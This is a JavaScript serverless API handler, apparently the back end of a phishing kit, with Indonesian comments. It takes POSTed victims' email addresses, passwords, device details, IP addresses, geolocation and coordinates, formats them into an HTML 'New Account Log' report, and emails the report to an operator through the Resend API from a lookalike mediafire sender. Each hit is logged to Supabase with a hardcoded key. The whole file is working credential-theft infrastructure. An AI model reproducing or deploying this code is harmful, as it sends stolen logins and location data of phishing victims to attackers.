export const config = { api: { bodyParser: true } };

function countryFlag(code){
    if (!code || code.length !== 2) return "";
    const codePoints = code.toUpperCase().split("").map(function(c){ return 127397 + c.charCodeAt(0); });
    return String.fromCodePoint.apply(null, codePoints);
}

export default async function handler(req, res) {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    if (req.method === "OPTIONS") return res.status(200).end();
    if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

    const API_KEY = process.env.RESEND_API_KEY;
    if (!API_KEY) return res.status(500).json({ error: "API_KEY_MISSING" });

    try {
        let d = req.body;
        if (typeof d === "string") d = JSON.parse(d);
        if (!d) return res.status(400).json({ error: "BODY_EMPTY" });

        const WEB_ID = d.web_id || "web_default"; 
        const PLATFORM = d.platform || "Unknown";

        const SUPABASE_URL = "https://djradeolrbjmgoxxbdlj.supabase.co"; 
        const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqcmFkZW9scmJqbWdveHhiZGxqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTU1OTA0NDQsImV4cCI6MjExMTE2NjQ0NH0.RvLrul0eFafGUcOn_9ORB8xh3IaP4n1FAsEmqXnrXCA";     
        
        let EMAIL = "admin@domain.com"; 
        let NAMA = "WEB KENZO"; 

        try {
            const rCfg = await fetch(`${SUPABASE_URL}/rest/v1/web_config?web_id=eq.${WEB_ID}&select=*`, {
                headers: { "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` }
            });
            const cfgData = await rCfg.json();
            if (cfgData && cfgData[0]) {
                if (cfgData[0].email_tujuan) EMAIL = cfgData[0].email_tujuan;
                if (cfgData[0].nama_ress) NAMA = cfgData[0].nama_ress.split('<')[0].trim();
            }
        } catch(e) { console.log("Gagal ambil config:", e); }

        const flag = countryFlag(d.negaraKode || "");
        const previewText = "ID | +62 | LOGIN " + PLATFORM + " | IP " + (d.ip || "-");

        // DESAIN BARU: CLEAN WHITE & MODERN
        const htmlBody = `
        <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">${previewText}</div>
        <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f3f4f6; padding: 30px 15px;">
          <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);">
            
            <div style="background-color: #111827; padding: 24px 30px; text-align: left; border-bottom: 4px solid #3b82f6;">
              <h1 style="margin: 0; font-size: 20px; font-weight: 600; color: #ffffff; letter-spacing: 0.5px;">${NAMA}</h1>
              <p style="margin: 4px 0 0 0; font-size: 13px; color: #9ca3af;">New Account Log</p>
            </div>
            
            <div style="padding: 30px;">
              <h3 style="color: #374151; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin: 0 0 16px 0; border-bottom: 1px solid #e5e7eb; padding-bottom: 8px;">Account Info</h3>
              <table style="width: 100%; border-collapse: collapse; margin-bottom: 30px;">
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280; width: 35%;">Email</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.email || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Password</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #ef4444; font-weight: 600;">${d.password || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Platform</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">
                    <span style="background-color: #eff6ff; color: #1d4ed8; padding: 4px 8px; border-radius: 4px; font-size: 12px;">${PLATFORM}</span>
                  </td>
                </tr>
              </table>

              <h3 style="color: #374151; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin: 0 0 16px 0; border-bottom: 1px solid #e5e7eb; padding-bottom: 8px;">Device Info</h3>
              <table style="width: 100%; border-collapse: collapse; margin-bottom: 30px;">
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280; width: 35%;">Device</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.device || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">OS Version</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.os || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Browser</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.browser || "-"}</td>
                </tr>
              </table>

              <h3 style="color: #374151; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; margin: 0 0 16px 0; border-bottom: 1px solid #e5e7eb; padding-bottom: 8px;">Location Info</h3>
              <table style="width: 100%; border-collapse: collapse;">
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280; width: 35%;">IP Address</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.ip || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Country</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${flag} ${d.negara || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Province</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.prov || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">City</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.kota || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">ISP</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.isp || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Coordinates</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.koord || "-"}</td>
                </tr>
                <tr>
                  <td style="padding: 10px 0; font-size: 14px; color: #6b7280;">Time</td>
                  <td style="padding: 10px 0; font-size: 14px; color: #111827; font-weight: 600;">${d.waktu || "-"}</td>
                </tr>
              </table>
            </div>

            <div style="background-color: #f9fafb; padding: 20px; text-align: center; border-top: 1px solid #e5e7eb;">
              <p style="margin: 0; font-size: 12px; color: #9ca3af;">Generated by ${NAMA} System &bull; ${new Date().getFullYear()}</p>
            </div>
          </div>
        </div>`;

        const response = await fetch("https://api.resend.com/emails", {
            method: "POST",
            headers: { "Authorization": "Bearer " + API_KEY, "Content-Type": "application/json" },
            body: JSON.stringify({
                from: NAMA + " <hasilress@mediafire.my.id>",
                to: [EMAIL],
                subject: "🥷 " + NAMA + " 🥷 | " + PLATFORM + " | " + new Date().toLocaleTimeString("id-ID"), // GUE TAMBAHIN JAM BIAR GMAIL GA CACHE
                html: htmlBody
            })
        });

        const data = await response.json();
        console.log("RESPONSE RESEND:", data);

        if (response.ok) {
            try {
                await fetch(`${SUPABASE_URL}/rest/v1/logs_result`, {
                    method: "POST",
                    headers: { "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}`, "Content-Type": "application/json" },
                    body: JSON.stringify({ web_id: WEB_ID, created_at: new Date().toISOString() })
                });
            } catch(e) { console.log("Gagal nyatet log:", e); }
        }
        return res.status(response.status).json(data);
    } catch (error) {
        return res.status(500).json({ error: "CATCH_ERROR", message: error.message });
    }
}
